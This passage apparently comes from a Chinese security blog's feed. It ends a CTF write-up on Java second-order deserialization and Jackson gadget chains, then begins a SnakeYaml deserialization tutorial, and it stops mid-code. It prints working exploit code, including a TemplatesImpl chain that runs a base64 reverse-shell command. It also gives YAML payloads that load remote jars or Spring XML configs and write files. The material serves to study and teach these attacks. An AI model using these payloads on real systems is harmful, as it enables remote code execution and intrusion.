class="hljs-comment">//URLHelper urlHelper = new URLHelper(&quot; file:///&quot;);</span><br>        <span class="hljs-type">URLVisiter</span> <span class="hljs-variable">urlVisiter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLVisiter</span>();<br>        setFieldValue(urlHelper, <span class="hljs-string">&quot;visiter&quot;</span>, urlVisiter);<br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(urlHelper, privateKey, signingEngine);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(exp, jsonNodes);<br>        System.out.println(serial(exp));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object arg)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(obj, arg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211139099.png" alt="image-20240803211139099"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211143135.png" alt="image-20240803211143135"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211146962.png" alt="image-20240803211146962"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211151783.png" alt="image-20240803211151783"></p><p>第二个方法更神，因为直接RCE了。</p><h3 id="TemplatesImpl恶意字节码"><a href="#TemplatesImpl恶意字节码" class="headerlink" title="TemplatesImpl恶意字节码"></a>TemplatesImpl恶意字节码</h3><p>这个方法甚至不需要它的URLHelper和URLVisiter，直接能反弹shell。</p><p>思路来源是AliyunCTF2023的Bypassit1。</p><p>不卖关子了，直接上：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, (ProtectionDomain)<span class="hljs-literal">null</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        &#125;<br><br>        <span class="hljs-type">byte</span>[] code = getTemplates();<span class="hljs-comment">//用javassist获取</span><br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xxx&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>,  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, codes);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, node);<br><br>        System.out.println(serial(val));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serial</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64String</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>        <span class="hljs-keyword">return</span> base64String;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getTemplates() <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;MyTemplate&quot;</span>);<br>        template.setSuperclass(pool.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">block</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,&lt;base64反弹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>;<br>        template.makeClassInitializer().insertBefore(block);<br>        <span class="hljs-keyword">return</span> template.toBytecode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String field, Object val)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">dField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(field);<br>        dField.setAccessible(<span class="hljs-literal">true</span>);<br>        dField.set(obj, val);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>打一次hack即可，因为反序列化已经成功：</p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211441966.png" alt="image-20240803211441966"></p><p><img src="/2024/08/03/%E4%BB%8E%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22023Baby-URL%E7%9C%8B%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CJackson%E5%8E%9F%E7%94%9F%E9%93%BE/image-20240803211445638.png" alt="image-20240803211445638"></p><p>二次反序列化的研究我会后续再单开一个文章，因为也非常具有研究价值。可看<a href="https://xz.aliyun.com/t/13900?time__1311=GqmxnD2D97itqGNDQieBK4rci1LnEbD">浅谈Java二次反序列化 - 先知社区 (aliyun.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SnakeYaml</title>
    <link href="/2024/08/03/SnakeYaml/"/>
    <url>/2024/08/03/SnakeYaml/</url>
    
    <content type="html"><![CDATA[<p>SnakeYaml也算是常见的包，在之前打题的时候遇到过，国决java题两道solon也有这个包。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SnakeYaml是一个完整的YAML1.1规范Processor，用于解析YAML，序列化以及反序列化，支持UTF-8&#x2F;UTF-16，支持Java对象的序列化&#x2F;反序列化，支持所有YAML定义的类型。</p><h2 id="Basic-Practice"><a href="#Basic-Practice" class="headerlink" title="Basic Practice"></a>Basic Practice</h2><p>依赖如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.yaml<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>snakeyaml<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.27<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>两个方法：</p><ul><li>Yaml.load()：入参是一个字符串或者一个文件，返回一个Java对象</li><li>Yaml.dump()：将一个对象转化为yaml文件形式</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.snake.demo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Non Arg Constructor&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I am &quot;</span> + name + <span class="hljs-string">&quot;, &quot;</span> + age + <span class="hljs-string">&quot; years old&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;taco&quot;</span>, <span class="hljs-number">18</span>);<br><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>System.out.println(yaml.dump(user));<br></code></pre></td></tr></table></figure><blockquote><p>打印结果:</p><p>getName</p><p>!!com.snake.demo.User {age: 18, name: taco}</p></blockquote><p><strong>!!用于强制类型转换，与fastjson中@type字段类似</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">dump()还调用了非<span class="hljs-keyword">public</span>成员的getter<br></code></pre></td></tr></table></figure><h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.snake.demo.User &#123;age: 18, name: taco&#125;&quot;</span>;<br><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> yaml.load(s);<br>System.out.println(user);<br></code></pre></td></tr></table></figure><blockquote><p>Non Arg Constructor</p><p>setName</p><p>I am taco, 18 years old</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">load()调用了无参构造器和非<span class="hljs-keyword">public</span>成员的setter<br></code></pre></td></tr></table></figure><p>实际上不仅无参构造器能够调用，还能指定调用有参构造器，只要传参类型为有参构造器的参数类型即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!com.snake.demo.User [\&quot;taco\&quot;, 18]&quot;</span>;<br><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> yaml.load(s);<br>System.out.println(user);<br></code></pre></td></tr></table></figure><blockquote><p>Arg Constructor Called</p><p>I am taco, 18 years old</p></blockquote><p>此时就不会调用<code>setter</code>方法了</p><blockquote><p>若类属性是public修饰，不会调用对应的setter方法，而是通过反射来set</p></blockquote><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>yaml反序列化时通过<code>!!</code> + 全类名指定反序列化的类，和fastjson一样都会调用setter，不过对于public修饰的成员不会调用其setter，除此之外，snakeyaml反序列化时还能调用该类的构造函数（fastjson是通过ASM生成的）。</p><h3 id="ScriptEngineManager"><a href="#ScriptEngineManager" class="headerlink" title="ScriptEngineManager"></a>ScriptEngineManager</h3><p>构造<code>ScriptEngineManager</code>payload，利用SPI机制通过<code>URLClassLoader</code>远程加载恶意字节码文件。</p><p>Github上面的EXP：<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>工具的工程classpath下存在<code>META-INF/services</code>文件夹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.script.ScriptEngineFactory<br></code></pre></td></tr></table></figure><blockquote><p>artsploit.AwesomeScriptEngineFactory</p></blockquote><p>打成jar包</p><blockquote><p>javac src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java</p><p>jar -cvf yaml-payload.jar -C src&#x2F; .</p></blockquote><p>将生成yaml-payload.jar包放在web服务上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 9999<br></code></pre></td></tr></table></figure><blockquote><p>!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [“<a href="http://127.0.0.1:9999/yaml-payload.jar%22]">http://127.0.0.1:9999/yaml-payload.jar&quot;]</a> ]] ]</p></blockquote><p><img src="/2024/08/03/SnakeYaml/image-20240803154021356.png" alt="image-20240803154021356"></p><p>触发流程如下：</p><p><code>javax.script.ScriptEngineManager</code></p><p><img src="/2024/08/03/SnakeYaml/image-20240803154059167.png" alt="image-20240803154059167"></p><p><img src="/2024/08/03/SnakeYaml/image-20240803154133518.png" alt="image-20240803154133518"></p><p><code>ScriptEngineManager</code>的无参构造器调用了init()，进行初始化设置后调用<code>initEngines()</code>，用于初始化脚本引擎。</p><p>接着到<code>getServiceLoader</code>，用于获取<code>ServiceLoader</code>迭代器</p><p><img src="/2024/08/03/SnakeYaml/image-20240803154442837.png" alt="image-20240803154442837"></p><p>到了熟悉的<code>ServiceLoader.load()</code>返回一个<code>ServiceLoader&lt;T&gt;</code>，根据这个可以获取一个迭代器，接下来还是熟悉的迭代遍历。</p><p><img src="/2024/08/03/SnakeYaml/image-20240803154716142.png" alt="image-20240803154716142"></p><p><code>next() =&gt; nextService()</code>会加载接口实现类并实例化，网上有详解。</p><h3 id="SpringFramework远程加载配置"><a href="#SpringFramework远程加载配置" class="headerlink" title="SpringFramework远程加载配置"></a>SpringFramework远程加载配置</h3><p>Spring当中有两个类的构造函数远程加载配置，可以构成RCE</p><blockquote><p>org.springframework.context.support.ClassPathXmlApplicationContext org.springframework.context.support.FileSystemXmlApplicationContext</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:p</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/p&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;exec&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>!!org.springframework.context.support.ClassPathXmlApplicationContext [“<a href="http://127.0.0.1:8888/evil.xml%22]">http://127.0.0.1:8888/evil.xml&quot;]</a></p></blockquote><p>既然能触发getter，那么fastjson的大部分payload也可以用。</p><h3 id="写文件加载本地jar"><a href="#写文件加载本地jar" class="headerlink" title="写文件加载本地jar"></a>写文件加载本地jar</h3><blockquote><p>!!sun.rmi.server.MarshalOutputStream [!!java.util.zip.InflaterOutputStream [!!java.io.FileOutputStream [!!java.io.File [“filePath”],false],!!java.util.zip.Inflater { input: !!binary base64 },length]]</p></blockquote><p>filepath是写入路径，base64str为经过zlib压缩过后的文件内容,length为文件大小</p><p>和fastjson一样，对于byte数组会自动进行base64解码(snakeyaml中为binary)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.utils.JavaUtils;<br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.zip.Deflater;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SnakeYamlFilePOC</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span 